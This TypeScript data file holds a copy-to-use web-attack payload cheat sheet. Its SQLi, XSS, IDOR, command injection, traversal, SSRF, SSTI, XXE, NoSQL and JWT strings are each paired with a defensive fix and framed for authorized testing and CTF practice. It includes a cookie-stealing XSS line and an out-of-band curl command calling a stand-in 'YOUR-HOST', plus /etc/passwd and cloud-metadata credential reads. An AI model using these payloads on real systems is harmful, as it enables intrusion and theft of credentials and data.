// A web-attack payload reference, rendered at /payloads. Copy-to-use test
// strings for the common web vulnerability classes, each paired with its
// defensive fix. Standard OWASP / PortSwigger-level payloads for AUTHORIZED
// testing and CTF practice only (your own labs, or a target you have written
// permission for). Maps to the OWASP Web Top 10 and the Web & Mobile track.

export type Payload = {
  t: string;   // what it tests / where to put it
  p: string;   // the payload to copy
  d?: string;  // what it does, or the fix it pairs with
};

export type PayloadGroup = { g: string; owasp?: string; note: string; items: Payload[] };

export const payloadLibrary: PayloadGroup[] = [
  {
    g: "SQL injection (SQLi)",
    owasp: "A03 Injection",
    note: "User input reaches a SQL query. Detect with a quote, then bypass auth or extract data. The fix for all of them: parameterised queries / prepared statements, never string concatenation.",
    items: [
      { t: "Detect", p: "'", d: "A SQL error or a changed response = injectable. Also try \" and `)`." },
      { t: "Auth bypass (login form)", p: "' OR '1'='1'-- -", d: "Makes the WHERE always true and comments out the password check; returns the first user." },
      { t: "Find the column count", p: "' ORDER BY 3-- -", d: "Increase until it errors — that's the number of columns (needed for UNION)." },
      { t: "UNION — extract data", p: "-1' UNION SELECT username,password FROM users-- -", d: "id=-1 returns no real row, so your SELECT renders. Match the column count/types." },
      { t: "Enumerate tables (MySQL)", p: "' UNION SELECT table_name,2 FROM information_schema.tables-- -", d: "Then columns: information_schema.columns WHERE table_name='users'." },
      { t: "Blind — boolean", p: "' AND 1=1-- -    vs    ' AND 1=2-- -", d: "Page differs between true/false = blind injection; extract char by char with SUBSTRING()." },
      { t: "Blind — time (MySQL · Pg · MSSQL)", p: "' AND SLEEP(5)-- -   |   '; SELECT pg_sleep(5)-- -   |   '; WAITFOR DELAY '0:0:5'-- -", d: "A delayed response proves injection when there's no visible output." },
    ],
  },
  {
    g: "Cross-site scripting (XSS)",
    owasp: "A03 Injection",
    note: "Input is reflected or stored without encoding, so your JavaScript runs in a victim's browser. Fix: context-aware output encoding, a Content-Security-Policy, and HttpOnly cookies.",
    items: [
      { t: "Confirm reflection", p: "<b>xss7q</b>", d: "If it comes back bold (not as text), the input isn't encoded — probe further." },
      { t: "Basic execution", p: "<script>alert(document.domain)</script>", d: "Proof of execution. Use document.domain, not alert(1), to show the origin." },
      { t: "When <script> is filtered", p: "<img src=x onerror=alert(1)>", d: "Event handlers run without a script tag; also <svg onload=...>." },
      { t: "Break out of an attribute", p: "\"><svg onload=alert(1)>", d: "Closes the current tag/attribute first, then injects." },
      { t: "Steal the cookie (the CTF goal)", p: "<script>new Image().src='//YOUR-HOST/?c='+document.cookie</script>", d: "The report bot/admin runs it; the flag is usually their cookie. HttpOnly blocks this read." },
      { t: "DOM / JS context", p: "';alert(1);//", d: "When input lands inside a <script> string, break the string and the statement." },
    ],
  },
  {
    g: "IDOR / BOLA (broken access control)",
    owasp: "A01 Broken Access Control · API #1 BOLA",
    note: "The app returns an object just because you named it, without checking it's yours. IDOR (web) and BOLA (APIs) are the same bug. Fix: enforce object-level authorization on the server for every request — never trust a client-supplied id.",
    items: [
      { t: "Numeric id", p: "GET /api/orders/1001   →   try 1000, 1002, 999…", d: "Sequential IDs = walk other users' objects. Watch for a 200 with someone else's data." },
      { t: "Id in a query parameter", p: "GET /account?user_id=123   →   change to 124", d: "Same idea in a GET/POST parameter." },
      { t: "Id in a JSON body (PUT/PATCH)", p: "{ \"id\": 1002, \"email\": \"me@evil.example\" }", d: "Change someone else's record by swapping the id/owner field." },
      { t: "Mass assignment / privilege", p: "{ \"username\": \"me\", \"role\": \"admin\", \"is_verified\": true }", d: "Add fields the UI never sends; the server may blindly bind them. Fix: allow-list bindable fields." },
      { t: "'Unpredictable' ID (UUID/hash)", p: "/files/3f2a…  — look in referrers, old responses, exports, timestamps", d: "A hard-to-guess ID is not access control. The fix is still a server-side ownership check." },
      { t: "Method / endpoint swap", p: "GET /api/admin/users   (as a normal user)", d: "Try admin-only routes and other HTTP methods (PUT/DELETE) directly — the UI hiding them isn't a control." },
    ],
  },
  {
    g: "Command injection",
    owasp: "A03 Injection",
    note: "User input is passed to a system shell. Fix: don't shell out — use language APIs; if you must, allow-list and pass arguments as an array, never a string.",
    items: [
      { t: "Chain a command", p: "; id    |    | id    |    && id    |    $(id)    |    `id`", d: "Different separators for different contexts; `id` is a safe proof-of-concept." },
      { t: "Newline injection", p: "%0a id", d: "A URL-encoded newline when the input is a single line/argument." },
      { t: "Blind / out-of-band", p: "; curl http://YOUR-HOST/$(whoami)", d: "No output on the page? Make the server call you — the request (and its subdomain) confirms it." },
    ],
  },
  {
    g: "Path traversal / LFI",
    owasp: "A01 Broken Access Control",
    note: "A filename parameter lets you climb out of the intended folder. Fix: resolve to a canonical path and allow-list it; never concatenate user input into a file path.",
    items: [
      { t: "Read a system file", p: "../../../../../../etc/passwd", d: "Windows: ..\\..\\..\\windows\\win.ini. Add enough ../ to reach the root." },
      { t: "URL-encode the slashes", p: "..%2f..%2f..%2fetc%2fpasswd   (double: ..%252f)", d: "Beats naive filters that strip literal ../." },
      { t: "PHP filter wrapper", p: "php://filter/convert.base64-encode/resource=index.php", d: "Read source without executing it, then Base64-decode." },
      { t: "Null byte (legacy)", p: "../../etc/passwd%00.png", d: "Old PHP: truncates an appended extension. Rare now, still seen in challenges." },
    ],
  },
  {
    g: "SSRF (server-side request forgery)",
    owasp: "A10 SSRF",
    note: "You control a URL the server fetches, so you reach things it can but you can't. Fix: allow-list outbound hosts, block link-local/metadata ranges, and don't let users supply internal URLs.",
    items: [
      { t: "Reach internal services", p: "http://127.0.0.1:80/    ·    http://localhost/admin", d: "The server can talk to localhost and the internal network; you can't directly." },
      { t: "Cloud metadata (AWS)", p: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", d: "The classic SSRF-to-credentials. GCP/Azure have their own 169.254.169.254 paths." },
      { t: "Bypass a localhost filter", p: "http://127.1/    ·    http://[::1]/    ·    http://2130706433/", d: "Alternate loopback forms (short, IPv6, decimal) slip past string blocklists." },
    ],
  },
  {
    g: "SSTI (template injection)",
    owasp: "A03 Injection",
    note: "Input is rendered as a template, not data. Fix: never put user input in a template; use logic-less templates and sandboxing.",
    items: [
      { t: "Detect", p: "{{7*7}}    ·    ${7*7}    ·    #{7*7}", d: "A result of 49 means the expression was evaluated (Jinja2/Twig use {{ }}, others differ)." },
      { t: "Identify the engine (Jinja2)", p: "{{config}}    ·    {{ self }}", d: "Leaks config/objects in Flask/Jinja2; from there it can escalate to code execution in a lab." },
    ],
  },
  {
    g: "XXE (XML external entity)",
    owasp: "A05 Security Misconfiguration",
    note: "An XML parser resolves external entities. Fix: disable DTDs / external entities in the parser (the default in modern libraries).",
    items: [
      { t: "Read a local file", p: "<?xml version=\"1.0\"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<r>&xxe;</r>", d: "Submit where the app accepts XML; the entity is expanded into the response." },
    ],
  },
  {
    g: "NoSQL injection (MongoDB)",
    owasp: "A03 Injection",
    note: "User input becomes a query operator instead of a value. Fix: validate and cast types; never pass a raw user object into a query.",
    items: [
      { t: "Auth bypass (JSON body)", p: "{ \"username\": \"admin\", \"password\": { \"$ne\": null } }", d: "$ne null matches any password; $gt \"\" works too." },
      { t: "Auth bypass (form / query)", p: "username[$ne]=x&password[$ne]=x", d: "Same attack when the body is form-encoded and parsed into an object." },
    ],
  },
  {
    g: "JWT & auth",
    owasp: "A07 Identification & Authentication Failures",
    note: "Tokens that aren't verified properly. Fix: verify the signature with a strong key and an algorithm allow-list; reject alg:none.",
    items: [
      { t: "alg:none", p: "{\"alg\":\"none\",\"typ\":\"JWT\"}  →  header.payload.  (empty signature)", d: "If the server accepts it, you can forge any claims. Decode/inspect in /tools → JWT or jwt.io." },
      { t: "Weak HMAC secret", p: "hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt", d: "Crack a guessable HS256 secret offline, then sign your own token." },
      { t: "Tamper the claims", p: "{ \"sub\": \"admin\", \"role\": \"admin\" }", d: "Change the role/user in the payload; only a verified signature should stop this." },
    ],
  },
];
